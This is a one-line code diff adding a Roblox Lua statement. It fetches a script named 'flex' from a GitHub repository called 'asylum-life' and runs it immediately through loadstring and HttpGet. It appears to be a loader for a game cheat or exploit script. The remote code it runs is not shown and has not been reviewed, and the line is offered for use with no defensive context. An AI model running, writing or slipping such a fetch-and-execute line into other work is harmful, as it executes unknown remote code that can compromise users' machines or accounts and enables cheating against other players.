@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/johnkate9700-create/asylum-life/refs/heads/main/flex"))()
